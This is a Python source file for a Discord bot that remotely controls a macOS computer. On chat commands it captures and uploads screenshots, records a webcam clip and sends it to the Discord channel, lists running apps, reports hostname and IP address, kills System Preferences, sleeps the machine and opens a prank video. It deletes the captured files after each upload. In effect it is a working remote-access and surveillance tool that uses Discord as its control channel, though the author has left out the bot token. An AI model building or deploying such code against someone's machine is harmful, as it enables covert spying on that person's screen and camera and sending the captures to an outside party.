import subprocess, os, time
import discord
from discord.ext import commands
from subprocess import call
from time import gmtime, strftime
import socket
import platform

client = discord.Client()
path = 'put your file path here'


# -- functions --

# screenshot
def take_screen_shot():
  # adds the date and time to the name of the screenshot
  call(["screencapture", "Screenshot" + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ".jpg"])

# checks if app is open
def is_runnning(app):
  count = int(subprocess.check_output(["osascript",
              "-e", "tell application \"System Events\"",
              "-e", "count (every process whose name is \"" + app + "\")",
              "-e", "end tell"]).strip())
  return count > 0

# gets ip address
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'     
    finally:
        s.close()
    return IP



# discord bot
@client.event
async def on_ready():
  print("Program has logged in as {0.user}".format(client)) # prints to console
  
@client.event
async def on_message(message):
  if message.author == client.user:
    return
  if client.user.mentioned_in(message):
    h_name = socket.gethostname()
    await message.channel.send('Bot is logged into '+h_name+'!')

  elif message.content.startswith("!quit"):
    await message.channel.send('Goodbye!')
    exit()


  # System Preferences
  SysPref = (is_runnning("System Preferences"))
  process = subprocess.Popen(["sleep","0.5"]) 
    

  # ----- bot commands ------
  if message.content.startswith("!close SysPref") and SysPref==True:
    os.system("pkill System Preferences")
    await message.channel.send("System Preferences closed!")
  elif message.content.startswith("!close SysPref") and SysPref==False:
    await message.channel.send("System Preferences is not open")


  # takes a screenshot of the user's screen
  elif message.content.startswith("!screenshot"):
    take_screen_shot() #links to function that takes ss
    for file in os.listdir(path):
      if file.endswith(".jpg"):
        await message.channel.send(file=discord.File(file))
        time.sleep(2)
        os.remove(file)

  # puts the device in sleep mode
  elif message.content.startswith("!sleep"):
    await message.channel.send("Putting your mac to sleep in 5 seconds...")
    os.system('osascript sleep.scpt {} "{}"') # executes applescript code, exclusive to macOS
  
  # records a 5 second clip through the user's camera
  elif message.content.startswith("!record"):
    await message.channel.send("Recording your webcam... ")
    os.system('osascript record.scpt {} "{}"') # executes applescript code, exclusive to macOS
    for file in os.listdir(path):
      if file.endswith(".mov"): 
        await message.channel.send(file=discord.File(file))
        time.sleep(2)
        os.remove(file)

        
  # gives list of all currently running apps
  elif message.content.startswith("!apps"):
    apps = str(subprocess.check_output(["osascript",
              "-e", "tell application \"Finder\"",
              "-e", "get the name of every process whose visible is true",                          
              "-e", "end tell"]).strip())
    # VS Code shows up as 'Electron' while other Electron apps (eg Discord) do not
    await message.channel.send(apps)
       
  # gives info about host device eg hostname and IP    
  elif message.content.startswith("!info"):
    h_name = socket.gethostname()
    IP_addres = socket.gethostbyname(h_name)
    await message.channel.send("**Operating System:** "+platform.system())
    await message.channel.send("**Host Name is:** " + h_name)
    await message.channel.send("**Computer IP Address (localhost) is:** " + IP_addres)
    await message.channel.send(get_ip()+"\n")
     
  # opens a tab that opens "Never Gonna Give You Up" in the user's browser    
  elif message.content.startswith("!rickroll"):
    os.system('osascript rickroll.scpt {} "{}"') # executes applescript code, exclusive to macOS
    

    
# removing my key as to prevent malicious use
client.run('key goes here')
